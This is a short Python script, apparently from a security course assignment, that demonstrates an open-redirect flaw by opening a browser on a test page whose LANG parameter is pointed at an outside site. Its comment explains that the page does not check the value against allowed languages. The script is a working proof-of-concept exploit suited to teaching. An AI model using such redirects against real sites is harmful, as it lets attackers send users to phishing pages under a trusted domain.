import webbrowser

# Exploit: site uses HTTP parameter for redirect, but does not check
# if the argument is within the permissible values of [en, fr, jp, cn]

def main():
    webbrowser.open("http://wsb.com/Assignment2/case18/case18.php?LANG=http://www.google.com", 2)

if __name__ == "__main__":
    main()
